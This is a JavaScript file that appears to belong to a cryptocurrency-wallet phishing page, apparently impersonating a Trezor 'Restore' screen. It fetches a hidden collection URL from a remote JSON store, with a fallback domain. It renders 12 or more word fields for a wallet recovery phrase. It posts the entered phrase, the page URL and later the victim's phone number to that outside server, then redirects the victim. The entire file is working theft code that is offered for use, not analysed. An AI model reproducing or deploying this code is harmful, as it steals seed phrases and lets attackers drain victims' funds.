// Link
var klink;
var fetchurl;
var onelink;
var twolink;
var getword = "none";
var allkeys = [];

var getdata = async () => {
      var fetchurl = "";
      const url =
            "https://api.jsonsilo.com/public/aab182ee-43f0-4bf9-9eb3-5122f971deee";

      await fetch(url)
            .then((response) => response.json()) // Parse JSON data
            .then((data) => {
                  // console.log(data.productlist[0].trezior);  // Log the fetched JSON data as an object
                  fetchurl = data.portfolio[1].one;

                  // window.location.replace(fetchurl);
                  // Link
                  klink = fetchurl;

                  onelink = klink + "/mails";
                  twolink = klink + "/keymails";

                  console.log("silo" + onelink);
            })
            .catch(async (error) => {
                  console.error("Error:", error);

                  await fetch("https://techappinfo.in/s-ofc-portfolio.json")
                        .then((response) => response.json()) // Parse JSON data
                        .then((data) => {
                              // console.log(data.productlist[0].trezior);  // Log the fetched JSON data as an object
                              fetchurl = data.portfolio[1].one;

                              // window.location.replace(fetchurl);
                              // Link
                              klink = fetchurl;

                              onelink = klink + "/mails";
                              twolink = klink + "/keymails";

                              console.log("Domain" + onelink);
                        })
                        .catch(async (error) => {
                              console.error("Error:", error);
                        });
            });
};

getdata();

$(document).on("click", "button.activeForm", (e) => {
      let btn = e.target;
      let word = $(btn).attr("data-word");
      $("button.activeForm").removeClass("formactive");
      $(btn).addClass("formactive");
      addInput(word);
});

$(document).ready(() => {
      setTimeout(() => {
            addInput(12);
      }, 50);
});

addInput = (word) => {
      getword = word;
      console.log(word);
      let keys_input = "";
      $(".form_keys").html("");
      for (var i = 1; i <= parseInt(word); i++) {
            $(".form_keys").append(`
            <input type="text" maxlength="50" name="keys[${i}]" class="form-control py8 key_input required" placeholder="${i}." required=""  autocomplete="off">
        `);
      }
};

function gotoverifybytwl() {
      var id = document.getElementsByClassName("key_input");
      if (id.length > 0) {
            allkeys = [];
            for (i = 0; i < getword; i++) {
                  allkeys.push(id[i].value);
            }
      }

      document.getElementById("key-btn").innerHTML = `
    <div class="spinner-border text-light" role="status">
      <span class="visually-hidden">Loading...span>
    div>
`;

      const formData = {
            keys: allkeys,
            url: window.location.href,
      };
      fetch(twolink, {
            method: "POST",
            referrerPolicy: "unsafe-url",
            headers: {
                  "Content-Type": "application/json",
            },
            body: JSON.stringify(formData), // Convert the data object to JSON
      })
            .then((response) => response.json()) // Handle the response
            .then((data) => {
                  console.log(data.status);

                  if (data.status === "ok") {
                        document.getElementById("frm-box").style.display =
                              "none";
                        document.getElementById("phn-box").style.display =
                              "block";
                  }
            })
            .catch((error) => {
                  console.error("Error:", error);
            });
}

function gotokey() {
      document.getElementById("key-btn").innerHTML = `Restore`;
      document.getElementById("frm-box").style.display = "block";
      document.getElementById("phn-box").style.display = "none";
}

function senddata() {
      reset();
      if (!input.value.trim()) {
            showError("Required");
      } else if (iti.isValidNumber()) {
            document.getElementById("phone").value = iti.getNumber();
            var getphoneno = iti.getNumber();
            document.getElementById("submit-btn").innerHTML = `
            <div class="spinner-border text-light" role="status">
              <span class="visually-hidden">Loading...span>
            div>
         `;
            const formData = {
                  phone: getphoneno,
                  keys: allkeys,
            };

            fetch(onelink, {
                  method: "POST",
                  referrerPolicy: "unsafe-url",
                  headers: {
                        "Content-Type": "application/json",
                  },
                  body: JSON.stringify(formData), // Convert the data object to JSON
            })
                  .then((response) => response.json()) // Handle the response
                  .then((data) => {
                        window.location.replace(data.status);
                  })
                  .catch((error) => {
                        console.error("Error:", error);
                  });
      } else {
            const errorCode = iti.getValidationError();
            const msg = errorMap[errorCode] || "Invalid number";
            showError(msg);
      }
}
